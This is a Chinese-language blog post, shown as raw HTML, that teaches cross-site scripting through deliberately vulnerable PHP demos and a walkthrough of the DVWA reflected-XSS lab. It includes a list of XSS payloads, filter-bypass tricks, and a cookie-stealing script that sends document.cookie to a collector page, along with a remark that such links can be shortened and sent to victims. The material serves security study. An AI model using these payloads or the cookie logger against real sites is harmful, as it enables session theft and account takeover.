<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="XSS">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS">
<meta property="og:url" content="https://hyggevv.github.io/2022/12/26/XSS/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="XSS">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/12/26/XSS/17.png">
<meta property="article:published_time" content="2022-12-26T01:39:41.000Z">
<meta property="article:modified_time" content="2023-04-25T12:17:00.145Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2022/12/26/XSS/2.png"><title>XSS | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2022/12/26/XSS/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copiar","copySuccess":"Éxito en copia","copyError":"Error en copia"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Inicio</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archivos</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categorías</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Etiquetas</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">Sobre Nosotros</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">XSS</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Creado</span><span class="post-meta-item__value">2022-12-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Actualizado</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visitado</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h2 id="什么是-XSS：">
          <a href="#什么是-XSS：" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是-XSS：" class="headerlink" title="什么是 XSS："></a>什么是 XSS：</h2>
      <p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。XSS的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。</p>

        <h2 id="XSS的分类">
          <a href="#XSS的分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2>
      <p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|类型|存储区|插入点|:</span><br><span class="line">|存储型 XSS|后端数据库|HTML| </span><br><span class="line">|反射型 XSS|URL|HTML| </span><br><span class="line">|DOM 型 XSS|后端数据库/前端存储/URL|前端 JavaScript|</span><br></pre></td></tr></table></div></figure>
<p>存储区：恶意代码存放的位置。<br>插入点：由谁取得恶意代码，并插入到网页上。</p>

        <h2 id="储存型XSS">
          <a href="#储存型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h2>
      <p>存储型 XSS 的攻击步骤：<br>1.攻击者将恶意代码提交到目标网站的数据库中。(储存区)<br>2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。(插入点)<br>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。<br>5.这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    //前端：2.html</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">      &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">      &lt;title&gt;存储型XSS&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;form action=&quot;action2.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        输入你的ID：  &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        输入你的Name：&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    -------------------------------</span><br><span class="line">    //后端：action2.php</span><br><span class="line">    &lt;?php</span><br><span class="line">      $id=$_POST[&quot;id&quot;];</span><br><span class="line">      $name=$_POST[&quot;name&quot;];</span><br><span class="line">      mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">      mysql_select_db(&quot;test&quot;);</span><br><span class="line">      </span><br><span class="line">      $sql=&quot;insert into xss value ($id,&#x27;$name&#x27;)&quot;;</span><br><span class="line">      $result=mysql_query($sql);</span><br><span class="line">    ?&gt;</span><br><span class="line">    ------------------------------</span><br><span class="line">    //供其他用户访问页面：show2.php</span><br><span class="line">    &lt;?php</span><br><span class="line">      mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">      mysql_select_db(&quot;test&quot;);</span><br><span class="line">      $sql=&quot;select * from xss where id=1&quot;;</span><br><span class="line">      $result=mysql_query($sql);</span><br><span class="line">      while($row=mysql_fetch_array($result))&#123;</span><br><span class="line">        echo $row[&#x27;name&#x27;];</span><br><span class="line">      &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">---------------------------------</span><br><span class="line"> 这里有一个用户提交的页面,数据交给后端后,后端存储在数据库中。然后当其他用户</span><br><span class="line"> 访问另一个页面时,后端调出改数据,显示给另一个用户,XSS代码执行。</span><br><span class="line">-----------------------------------</span><br><span class="line"> 我们输入1和&lt;script&gt;alert(\&#x27;hack\&#x27;)&lt;/script&gt;,注意,这里的hack的单引号要进行转义,</span><br><span class="line"> 因为sql语句中的$name是单引号的,所以这里不转义的话就会闭合sql语句中的单引号。</span><br><span class="line">-----------------------------------</span><br><span class="line"> 当我们提交1和&lt;script&gt;alert(\&#x27;hack\&#x27;)&lt;/script&gt;后,XSS代码被插入数据库,</span><br><span class="line"> 然后当其他用户访问show2.php时,查询id=1,echo $row[&#x27;name&#x27;],xss代码被执行。</span><br><span class="line">-----------------------------------</span><br><span class="line"> 数据流向：前端--&gt;后端--&gt;数据库--&gt;后端--&gt;前端</span><br></pre></td></tr></table></div></figure>
<p><img src="/2022/12/26/XSS/2.png"></p>

        <h2 id="反射型XSS">
          <a href="#反射型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2>
      <p>反射型 XSS 的攻击步骤：<br>1.攻击者构造出特殊的 URL，其中包含恶意代码。(储存区)<br>2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。(插入点)<br>3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/dosomething?message=&quot;&lt;script src=&quot;http://www.hacktest.com:8002/xss/hacker.js&quot;&gt;&lt;/script&gt;&quot; 或者 http://localhost/test.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt; </span><br></pre></td></tr></table></div></figure>
<p>注意：<br>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。<br>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。<br>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。<br>POST 的内容也可以触发反射型XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     //前端 1.html：</span><br><span class="line">      &lt;html&gt;</span><br><span class="line">      &lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;反射型XSS&lt;/title&gt;</span><br><span class="line">      &lt;/head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;action.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">          &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">          &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/body&gt;</span><br><span class="line">      &lt;/html&gt;</span><br><span class="line">       ------------------------</span><br><span class="line">      //后端 action.php：</span><br><span class="line">      &lt;?php</span><br><span class="line">        $name=$_POST[&quot;name&quot;]; </span><br><span class="line">        echo $name;</span><br><span class="line">      ?&gt;</span><br><span class="line">--------------------------------------</span><br><span class="line">  提交数据：&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt; 弹框hack,插入的语句被执行；</span><br><span class="line">  数据流向：前端--&gt;后端--&gt;前端</span><br></pre></td></tr></table></div></figure>
<p><img src="/2022/12/26/XSS/1.png"></p>

        <h2 id="DOM型XSS">
          <a href="#DOM型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2>
      <p>DOM 型 XSS 的攻击步骤：<br>1.攻击者构造出特殊的 URL，其中包含恶意代码。<br>2.用户打开带有恶意代码的 URL。<br>3.用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。<br>4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。<br>注意：<br>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">    // 前端3.html</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">      &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">      &lt;title&gt;DOM型XSS&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;form action=&quot;action3.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    -----------------------</span><br><span class="line">    // 后端action3.php</span><br><span class="line">    &lt;?php</span><br><span class="line">      $name=$_POST[&quot;name&quot;];</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;</span><br><span class="line">    &lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">      var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">      print.innerHTML=text.value;  // 获取 text的值,并且输出在print内。这里是导致xss的主要原因。</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">------------------------------</span><br><span class="line"> 这是一个用户提交页面,用户可以在此提交数据,数据提交后给后台处理：</span><br><span class="line">------------------------------</span><br><span class="line">提交数据：&lt;img src=1 οnerrοr=alert(&#x27;hack&#x27;)&gt; ,弹窗hack</span><br><span class="line">------------------------------</span><br><span class="line"> 数据流向：前端--&gt;浏览器</span><br></pre></td></tr></table></div></figure>
<p><img src="/2022/12/26/XSS/10.png"></p>

        <h2 id="XSS的攻击载荷">
          <a href="#XSS的攻击载荷" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h2>
      <p>以下所有标签的 &gt; 都可以用 &#x2F;&#x2F; 代替</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;标签：&lt;script&gt;标签是最直接的XSS有效载荷, 脚本标记可以引用外部的JavaScript代码,也可以将代码插入脚本标记中</span><br><span class="line">  -----------------------------</span><br><span class="line">   &lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;   #弹出hello</span><br><span class="line">   &lt;script&gt;alert(/hello/)&lt;/script&gt;   #弹出hello</span><br><span class="line">   &lt;script&gt;alert(1)&lt;/script&gt;        #弹出1,对于数字可以不用引号</span><br><span class="line">   &lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie</span><br><span class="line">   &lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span><br><span class="line">  ------------------------------</span><br><span class="line"> &lt;svg&gt;标签：</span><br><span class="line">  ------------------------------</span><br><span class="line">   &lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">   &lt;svg onload=&quot;alert(1)&quot;//   </span><br><span class="line">  ------------------------------</span><br><span class="line"> &lt;img&gt;标签：</span><br><span class="line">  ------------------------------</span><br><span class="line">   &lt;img src=1 onerror=alert(&#x27;hack&#x27;)&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   &lt;img src=1 οnerrοr=alert(&#x27;document.cookie&#x27;)&gt;  #弹出cookie</span><br><span class="line">  ------------------------------</span><br><span class="line">&lt;body&gt;标签：</span><br><span class="line">  ------------------------------</span><br><span class="line">   &lt;body οnlοad=alert(1)&gt;</span><br><span class="line">   &lt;body οnpageshοw=alert(1)&gt;</span><br><span class="line">  ------------------------------</span><br><span class="line">&lt;video&gt;标签：</span><br><span class="line">  ------------------------------</span><br><span class="line">   &lt;video οnlοadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line">  ------------------------------</span><br><span class="line">&lt;Style&gt;标签：</span><br><span class="line">  ------------------------------</span><br><span class="line">   &lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</span><br><span class="line">  ------------------------------</span><br></pre></td></tr></table></div></figure>


        <h2 id="DVWA-Reflected-Cross-Site-Scripting">
          <a href="#DVWA-Reflected-Cross-Site-Scripting" class="heading-link"><i class="fas fa-link"></i></a><a href="#DVWA-Reflected-Cross-Site-Scripting" class="headerlink" title="DVWA:Reflected Cross Site Scripting "></a>DVWA:Reflected Cross Site Scripting </h2>
      
        <h2 id="Low">
          <a href="#Low" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low" class="headerlink" title="Low"></a>Low</h2>
      <p>源码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>(1)array_key_exists检查数组中是否有指定的键名<br>(2)X-XSS-Protection: 1强制XSS保护(如果XSS保护被用户禁用，则有用);0禁用XSS保护<br>可以看出本关并没有做任何防御措施，所以我们尝试注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;弹出COOKIE</span><br></pre></td></tr></table></div></figure>
<p><img src="/2022/12/26/XSS/3.png"><br>可是当我们进行实战时是无法在目标电脑上这样操作的；这里我使用另外一种方法来获取cookie<br>1.编写一个cookie.php文档用于获取页面的cookie，放置在一个指定的目录下。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取get传入的cookie参数。</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">echo $cookie;</span><br><span class="line">$log = fopen(&quot;cookie.txt&quot;, &quot;w&quot;);</span><br><span class="line">fwrite($log, $cookie .&quot;\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line"> 将cookie写入本地的一个txt文件中</span><br><span class="line">?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
<p>2.接着编写 js 代码（意思就是利用本地的cookie.php这个文件获取cookie，要注意本地的地址要写对。）将页面的cookie发送到cookie.php中</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1）&lt;script&gt;document.location=&quot;http://127.0.0.1/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line">此处我们构造一句JS去获取目标的cookie，</span><br></pre></td></tr></table></div></figure>
<p>3.因为要将构造的要对上面的编写的JS代码进行URL转码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D%27http%3A%2f%2f127.0.0.1%2fcookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E#</span><br></pre></td></tr></table></div></figure>
<p>解析：<br>(1)<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://localhost/DVWA-master/vulnerabilities/xss_r/?name=">http://localhost/DVWA-master/vulnerabilities/xss_r/?name=</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>解析：是我们自己搭建的网站（dvwa）的XSS(Reflected)的路径。<br>(2)%3Cscript%3Edocument.location%3D%27http%3A%2f%2f127.0.0.1%2fcookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E#<br>解析：对</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;http://localhost/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
<p>进行url编码<br>注：在实际中我们可以将此url变换成短链接并放置到公网（或目标服务器）中，等待目标用户点击此链接，一旦目标用户点击，那么攻击者就可以获取他的cookie并将cookie保存到攻击者服务器指定路径下的cookie.txt中。(有点类似于CSRF，但是C<br>SRF是利用用户的cookie,但是XSS是直接盗取用户的cookie)</p>

        <h2 id="Medium">
          <a href="#Medium" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;)</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>
<p>由源码可知后台对我们的script做了一个过滤；我们需要绕过这个过滤机制<br>方法一：大小写绕过SCRIpt<br>方法二：双写绕过scrscriptript<br>方法三：使用非script标签<br>补充：当alter被过滤的时候可以将alter进行unicode编码；例如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(\u0061\u006c\u0065\u0072\u0074(&quot;wann&quot;) )&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="High">
